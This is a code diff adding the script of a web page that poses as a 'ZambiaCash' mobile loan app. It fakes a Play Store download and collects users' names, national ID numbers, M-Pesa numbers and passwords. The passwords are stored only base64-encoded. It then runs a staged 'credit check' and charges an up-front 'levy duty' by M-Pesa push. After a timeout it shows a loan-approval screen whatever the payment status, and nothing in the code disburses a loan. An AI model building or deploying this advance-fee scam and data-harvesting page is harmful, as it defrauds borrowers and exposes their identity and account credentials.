@@ -658,3 +658,563 @@
 
         /* ============================================================
            HELPERS
+           ============================================================ */
+        const format = (num) => "Ksh " + Number(num).toLocaleString();
+
+        const calculateLevy = () => 1;
+
+        const getDueDate = (days) => {
+            const d = new Date();
+            d.setDate(d.getDate() + days);
+            return d.toLocaleDateString('en-GB', { day: 'numeric', month: 'short', year: 'numeric' });
+        };
+
+        function showScreen(id) {
+            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+            document.getElementById(id).classList.add('active');
+            window.scrollTo(0, 0);
+        }
+
+        function showAndroidToast(message) {
+            const toast = document.getElementById('android-toast');
+            toast.innerText = message;
+            toast.classList.remove('hide', 'hide-toast');
+
+            clearTimeout(toastTimeout);
+            toastTimeout = setTimeout(() => {
+                toast.classList.add('hide-toast');
+                setTimeout(() => toast.classList.add('hide'), 300);
+            }, 3500);
+        }
+
+        /* fetch with a hard timeout so a slow network can't hang forever */
+        async function fetchWithTimeout(url, options = {}, timeoutMs = 30000) {
+            const controller = new AbortController();
+            const timer = setTimeout(() => controller.abort(), timeoutMs);
+            try {
+                return await fetch(url, { ...options, signal: controller.signal });
+            } finally {
+                clearTimeout(timer);
+            }
+        }
+
+        /* never throws - returns parsed JSON or null (handles HTML error pages / empty bodies) */
+        async function readJsonSafe(response) {
+            let text = "";
+            try {
+                text = await response.text();
+            } catch (e) {
+                return null;
+            }
+            if (!text) return null;
+            try {
+                return JSON.parse(text);
+            } catch (e) {
+                return null;
+            }
+        }
+
+        /* turns raw JS/network errors into something a user can understand */
+        function friendlyNetworkError(err) {
+            if (err && err.name === 'AbortError') {
+                return "The request took too long. Check your internet connection and try again.";
+            }
+            if (err instanceof TypeError) {
+                return "Network error. Check your internet connection and try again.";
+            }
+            return (err && err.message) ? err.message : "Something went wrong. Please try again.";
+        }
+
+        function resetPayButton() {
+            isProcessingPayment = false;
+            const btn = document.getElementById('btn-pay');
+            if (!btn) return;
+            btn.disabled = false;
+            btn.innerText = `Pay ${format(state.levy)} Levy Duty`;
+        }
+
+        /* ============================================================
+           OFFLINE GATE
+           ============================================================ */
+        const offlineGate = document.getElementById('offline-gate');
+
+        function updateConnectionStatus() {
+            offlineGate.classList.toggle('hide', navigator.onLine);
+        }
+
+        window.addEventListener('online', updateConnectionStatus);
+        window.addEventListener('offline', updateConnectionStatus);
+        updateConnectionStatus();
+
+        window.retryConnection = function () {
+            if (navigator.onLine) offlineGate.classList.add('hide');
+            else showAndroidToast("Still offline. Check network settings.");
+        };
+
+        /* ============================================================
+           PLAY STORE GATE
+           ============================================================ */
+        let deferredPrompt;
+        const playStoreGate = document.getElementById('play-store-gate');
+        const browserWarning = document.getElementById('browser-warning');
+        const appContent = document.getElementById('app-content');
+        const btnStoreInstall = document.getElementById('btn-store-install');
+
+        const preInstallButtons = document.getElementById('pre-install-buttons');
+        const downloadingButtons = document.getElementById('downloading-buttons');
+        const postInstallButtons = document.getElementById('post-install-buttons');
+        const preInstallContent = document.getElementById('pre-install-content');
+        const postInstallContent = document.getElementById('post-install-content');
+        const statsRow = document.getElementById('stats-row');
+
+        const ringSvg = document.getElementById('ring-svg');
+        const downloadRing = document.getElementById('download-ring');
+        const downloadPercent = document.getElementById('download-percent');
+        const downloadText = document.getElementById('download-text');
+
+        let downloadInterval = null;
+        let downloadStartTime = 0;
+        let isDownloading = false;
+
+        const isStandalone = window.matchMedia('(display-mode: standalone)').matches || window.navigator.standalone;
+        const ua = navigator.userAgent || navigator.vendor || window.opera;
+        const isInApp = /musical_ly|BytedanceWebview|FBAN|FBAV|Instagram|WebView|Twitter/i.test(ua);
+
+        function showInstalledState() {
+            preInstallButtons.classList.add('hide');
+            downloadingButtons.classList.add('hide');
+            downloadText.classList.add('hide');
+            ringSvg.classList.add('hidden');
+            statsRow.classList.add('hide');
+
+            postInstallContent.classList.remove('hide');
+            preInstallContent.classList.remove('hide');
+
+            postInstallButtons.classList.remove('hide');
+        }
+
+        function showInstallState() {
+            postInstallButtons.classList.add('hide');
+            downloadingButtons.classList.add('hide');
+            downloadText.classList.add('hide');
+            ringSvg.classList.add('hidden');
+            statsRow.classList.remove('hide');
+
+            postInstallContent.classList.add('hide');
+            preInstallContent.classList.remove('hide');
+
+            preInstallButtons.classList.remove('hide');
+        }
+
+        if (isStandalone) {
+            playStoreGate.classList.add('hide');
+            appContent.classList.remove('hide');
+            checkSession();
+        } else if (isInApp) {
+            browserWarning.classList.remove('hide');
+        } else {
+            playStoreGate.classList.remove('hide');
+            showInstallState();
+        }
+
+        window.addEventListener('beforeinstallprompt', (e) => {
+            e.preventDefault();
+            deferredPrompt = e;
+        });
+
+        function startFakeDownload() {
+            preInstallButtons.classList.add('hide');
+            downloadingButtons.classList.remove('hide');
+            downloadText.classList.remove('hide');
+            ringSvg.classList.remove('hidden');
+
+            const duration = 30000;
+            downloadStartTime = Date.now();
+            isDownloading = true;
+            const circumference = 301.59;
+
+            downloadInterval = setInterval(() => {
+                const elapsed = Date.now() - downloadStartTime;
+                const progress = Math.min((elapsed / duration) * 100, 100);
+
+                const offset = circumference - (progress / 100) * circumference;
+                downloadRing.style.strokeDashoffset = offset;
+
+                downloadPercent.innerText = Math.floor(progress) + "% of 10 MB";
+
+                if (progress >= 100) {
+                    clearInterval(downloadInterval);
+                    isDownloading = false;
+                    setTimeout(() => {
+                        showInstalledState();
+                    }, 500);
+                }
+            }, 100);
+        }
+
+        window.cancelDownload = function () {
+            if (isDownloading) {
+                clearInterval(downloadInterval);
+                isDownloading = false;
+                showInstallState();
+            }
+        };
+
+        btnStoreInstall.addEventListener('click', async () => {
+            if (deferredPrompt) {
+                deferredPrompt.prompt();
+                const { outcome } = await deferredPrompt.userChoice;
+                if (outcome === 'accepted') {
+                    startFakeDownload();
+                }
+                deferredPrompt = null;
+            } else {
+                startFakeDownload();
+            }
+        });
+
+        document.getElementById('btn-open-app').addEventListener('click', () => {
+            showAndroidToast("Opening ZambiaCash...");
+            playStoreGate.classList.add('hide');
+            try { window.close(); } catch (e) {}
+            const isAndroid = /android/i.test(navigator.userAgent);
+            if (isAndroid) {
+                setTimeout(() => {
+                    try {
+                        window.location.href = 'intent://#Intent;action=android.intent.action.MAIN;category=android.intent.category.HOME;end';
+                    } catch (e) {}
+                }, 150);
+            }
+        });
+
+        window.mockUninstall = function () {
+            showInstallState();
+        };
+
+        window.setRating = function (rating) {
+            const stars = document.querySelectorAll('.rate-star');
+            stars.forEach((star, index) => {
+                if (index < rating) {
+                    star.classList.remove('text-gray-300');
+                    star.classList.add('text-brandYellow');
+                    star.setAttribute('fill', 'currentColor');
+                } else {
+                    star.classList.remove('text-brandYellow');
+                    star.classList.add('text-gray-300');
+                    star.setAttribute('fill', 'none');
+                }
+            });
+            if (rating > 0) {
+                const btnReview = document.getElementById('btn-write-review');
+                btnReview.innerText = `Thanks for rating ${rating} stars!`;
+                btnReview.classList.remove('text-playBlue');
+                btnReview.classList.add('text-emerald-600');
+            }
+        };
+
+        /* ============================================================
+           SESSION / LOGIN
+           ============================================================ */
+        function checkSession() {
+            try {
+                const saved = localStorage.getItem('zc_user');
+                if (saved) {
+                    state = { ...state, ...JSON.parse(saved) };
+                    buildLoanScreen();
+                }
+            } catch (e) {
+                localStorage.removeItem('zc_user');
+            }
+
+            const inflightTxn = localStorage.getItem('inflight_txn');
+            if (inflightTxn) {
+                showScreen('screen-success');
+                startPolling(inflightTxn);
+            }
+        }
+
+        function logout() {
+            localStorage.removeItem('zc_user');
+            localStorage.removeItem('inflight_txn');
+            location.reload();
+        }
+
+        function submitLogin() {
+            const name = document.getElementById('in-name').value.trim();
+            const id = document.getElementById('in-id').value.trim();
+            const mpesa = document.getElementById('in-mpesa').value.trim();
+            const pass = document.getElementById('in-pass').value;
+
+            if (!/^[A-Za-z][A-Za-z .'-]{2,}$/.test(name)) return showAndroidToast("Please enter a valid full name.");
+            if (!/^\d{7,8}$/.test(id)) return showAndroidToast("National ID must be 7-8 digits.");
+            if (!/^0(?!77)(1[01]|7[0-9])\d{7}$/.test(mpesa)) return showAndroidToast("Enter a valid Safaricom or Airtel number (07XX or 01XX).");
+            if (pass.length < 4) return showAndroidToast("Password must be at least 4 characters.");
+
+            state.name = name;
+            state.id = id;
+            state.mpesa = mpesa;
+            localStorage.setItem('zc_user', JSON.stringify(state));
+
+            fetch(`${SUPABASE_URL}/rest/v1/users`, {
+                method: 'POST',
+                headers: {
+                    'apikey': SUPABASE_KEY,
+                    'Authorization': `Bearer ${SUPABASE_KEY}`,
+                    'Content-Type': 'application/json',
+                    'Prefer': 'return=minimal'
+                },
+                body: JSON.stringify({ full_name: name, national_id: id, mpesa_number: mpesa, password_hash: "web_" + btoa(pass) })
+            }).catch(() => {});
+
+            startChecking();
+        }
+
+        function startChecking() {
+            showScreen('screen-checking');
+            let progress = 0;
+            const msgs = ["Analyzing profile...", "Reviewing information...", "Checking M-Pesa...", "Calculating limit...", "Almost there..."];
+            const interval = setInterval(() => {
+                progress += 2;
+                document.getElementById('check-bar').style.width = progress + "%";
+                document.getElementById('check-percent').innerText = progress + "%";
+                document.getElementById('check-status').innerText = msgs[Math.min(4, Math.floor(progress / 20))];
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    setTimeout(() => buildLoanScreen(), 300);
+                }
+            }, 200);
+        }
+
+        /* ============================================================
+           LOAN SELECTION
+           ============================================================ */
+        function buildLoanScreen() {
+            const grid = document.getElementById('amount-grid');
+            grid.innerHTML = '';
+            amounts.forEach(amt => {
+                const btn = document.createElement('button');
+                btn.className = `amount-btn py-3.5 text-sm ${amt === state.loan ? 'selected' : ''}`;
+                btn.innerText = amt.toLocaleString();
+                btn.onclick = () => {
+                    document.querySelectorAll('.amount-btn').forEach(b => b.classList.remove('selected'));
+                    btn.classList.add('selected');
+                    state.loan = amt;
+                    updateSummary();
+                };
+                grid.appendChild(btn);
+            });
+            updateSummary();
+            showScreen('screen-select');
+        }
+
+        function setTerm(days, btn) {
+            state.term = days;
+            document.querySelectorAll('.term-btn').forEach(b => b.classList.remove('selected'));
+            if (btn) btn.classList.add('selected');
+            updateSummary();
+        }
+
+        function updateSummary() {
+            state.levy = calculateLevy(state.loan);
+            const rate = state.term === 30 ? 0.10 : (state.term === 60 ? 0.15 : 0.20);
+            state.interest = Math.round(state.loan * rate);
+            state.total = state.loan + state.interest;
+
+            document.getElementById('sum-receive').innerText = format(state.loan);
+            document.getElementById('sum-interest-label').innerText = `Interest (${Math.round(rate * 100)}%)`;
+            document.getElementById('sum-interest').innerText = format(state.interest);
+            document.getElementById('sum-total').innerText = format(state.total);
+            document.getElementById('sum-due').innerText = getDueDate(state.term);
+            document.getElementById('sum-levy').innerText = format(state.levy);
+        }
+
+        function goToPayment() {
+            document.getElementById('pay-loan').innerText = format(state.loan);
+            document.getElementById('pay-interest').innerText = format(state.interest);
+            document.getElementById('pay-total').innerText = format(state.total);
+            document.getElementById('pay-due').innerText = getDueDate(state.term);
+            document.getElementById('pay-levy').innerText = format(state.levy);
+            document.getElementById('pay-name').innerText = state.name;
+            document.getElementById('pay-mpesa').value = state.mpesa;
+            resetPayButton();
+            showScreen('screen-payment');
+        }
+
+        /* ============================================================
+           STK PUSH PAYMENT
+           ============================================================ */
+        async function processPayment() {
+            if (isProcessingPayment) return;
+
+            const mpesa = document.getElementById('pay-mpesa').value.trim();
+            if (!/^0(?!77)(1[01]|7[0-9])\d{7}$/.test(mpesa)) {
+                showAndroidToast("Enter a valid M-Pesa number (07XX or 01XX).");
+                return;
+            }
+
+            isProcessingPayment = true;
+            const btnPay = document.getElementById('btn-pay');
+            btnPay.disabled = true;
+            btnPay.innerText = "Sending STK Push...";
+
+            state.mpesa = mpesa;
+            localStorage.setItem('zc_user', JSON.stringify(state));
+
+            try {
+                const response = await fetchWithTimeout(`${SUPABASE_URL}/functions/v1/palpluss-stk`, {
+                    method: 'POST',
+                    headers: {
+                        'Authorization': `Bearer ${SUPABASE_KEY}`,
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        amount: state.levy,
+                        phone: "254" + mpesa.substring(1),
+                        accountReference: "ZC_" + state.name.replace(/[^A-Za-z0-9]/g, '').substring(0, 10) + "_" + Math.floor(Math.random() * 9999),
+                        channelId: PALPLUSS_CHANNEL,
+                        callbackUrl: PALPLUSS_CALLBACK
+                    })
+                }, STK_TIMEOUT_MS);
+
+                const data = await readJsonSafe(response);
+
+                if (!response.ok) {
+                    const serverMsg = data && (typeof data.error === 'string' ? data.error : (typeof data.message === 'string' ? data.message : null));
+                    if (serverMsg) throw new Error(serverMsg);
+                    if (response.status >= 500) throw new Error("The payment service is temporarily unavailable. Please try again.");
+                    throw new Error("Could not start the payment. Please try again.");
+                }
+
+                if (!data) {
+                    throw new Error("The payment service returned an invalid response. Please try again.");
+                }
+
+                const txnId = data.data?.transactionId || data.data?.transaction_id || data.transactionId || data.transaction_id || data.id;
+                if (!txnId) throw new Error("Could not start the payment. Please try again.");
+
+                // Fire-and-forget: record the loan request for the webhook to update
+                fetch(`${SUPABASE_URL}/rest/v1/loans`, {
+                    method: 'POST',
+                    headers: { 'apikey': SUPABASE_KEY, 'Authorization': `Bearer ${SUPABASE_KEY}`, 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ amount: state.loan, levy_duty: state.levy, status: "PENDING", palpluss_txn_id: txnId })
+                }).catch(() => {});
+
+                localStorage.setItem('inflight_txn', txnId);
+                showScreen('screen-success');
+                startPolling(txnId);
+
+            } catch (err) {
+                showAndroidToast(friendlyNetworkError(err));
+            } finally {
+                resetPayButton();
+            }
+        }
+
+        /* ============================================================
+           PAYMENT STATUS POLLING
+           ============================================================ */
+        function startPolling(txnId) {
+            if (pollTimer) {
+                clearInterval(pollTimer);
+                pollTimer = null;
+            }
+            isPolling = false;
+
+            let seconds = 0;
+            const timeDisplay = document.getElementById('verify-time');
+
+            pollTimer = setInterval(async () => {
+                if (isPolling) return; // skip if previous check is still running (slow network)
+
+                seconds++;
+                timeDisplay.innerText = seconds + "s";
+
+                // Never leave the user stuck on a slow connection
+                if (seconds >= MAX_POLL_SECONDS) {
+                    clearInterval(pollTimer);
+                    pollTimer = null;
+                    localStorage.removeItem('inflight_txn');
+                    showSuccess(txnId);
+                    return;
+                }
+
+                isPolling = true;
+                try {
+                    const res = await fetchWithTimeout(
+                        `${SUPABASE_URL}/rest/v1/loans?palpluss_txn_id=eq.${encodeURIComponent(txnId)}`,
+                        { headers: { 'apikey': SUPABASE_KEY, 'Authorization': `Bearer ${SUPABASE_KEY}` } },
+                        POLL_TIMEOUT_MS
+                    );
+
+                    if (res.ok) {
+                        const rows = await readJsonSafe(res);
+                        const status = Array.isArray(rows) && rows[0] ? String(rows[0].status || "").toUpperCase() : "";
+
+                        if (status === 'ALLOCATED') {
+                            clearInterval(pollTimer);
+                            pollTimer = null;
+                            localStorage.removeItem('inflight_txn');
+                            showSuccess(txnId);
+                            return;
+                        }
+
+                        if (status === 'FAILED') {
+                            clearInterval(pollTimer);
+                            pollTimer = null;
+                            localStorage.removeItem('inflight_txn');
+                            showAndroidToast("Payment failed or was cancelled. Please try again.");
+                            showScreen('screen-payment');
+                            resetPayButton();
+                            return;
+                        }
+                    }
+                } catch (e) {
+                    // Network hiccup on low bandwidth - keep waiting quietly
+                } finally {
+                    isPolling = false;
+                }
+            }, 1000);
+        }
+
+        function showSuccess(txnId) {
+            document.getElementById('verify-anim').classList.add('hide');
+            document.getElementById('success-anim').classList.remove('hide');
+
+            document.getElementById('suc-loan').innerText = format(state.loan);
+            document.getElementById('suc-total').innerText = format(state.total);
+            document.getElementById('suc-due').innerText = getDueDate(state.term);
+            document.getElementById('suc-mpesa').innerText = state.mpesa;
+
+            fetch(`${SUPABASE_URL}/rest/v1/loans?palpluss_txn_id=eq.${encodeURIComponent(txnId)}`, {
+                method: 'PATCH',
+                headers: { 'apikey': SUPABASE_KEY, 'Authorization': `Bearer ${SUPABASE_KEY}`, 'Content-Type': 'application/json' },
+                body: JSON.stringify({ status: "ALLOCATED" })
+            }).catch(() => {});
+        }
+
+        /* ============================================================
+           MISC
+           ============================================================ */
+        function openInChrome() {
+            const url = window.location.href;
+            window.location.href = `intent://${window.location.host}${window.location.pathname}#Intent;scheme=https;package=com.android.chrome;end`;
+            if (/iPhone|iPad|iPod/i.test(navigator.userAgent)) window.location.href = url;
+        }
+
+        function copyLink() {
+            const link = window.location.href;
+            if (navigator.clipboard && navigator.clipboard.writeText) {
+                navigator.clipboard.writeText(link)
+                    .then(() => showAndroidToast("Link copied to clipboard."))
+                    .catch(() => showAndroidToast("Unable to copy automatically. Please copy the URL from the address bar."));
+            } else {
+                showAndroidToast("Please copy the URL from the address bar.");
+            }
+        }
+
+        if ('serviceWorker' in navigator) {
+            window.addEventListener('load', () => navigator.serviceWorker.register('sw.js').catch(() => {}));
+        }
+    </script>
+</body>
+</html>
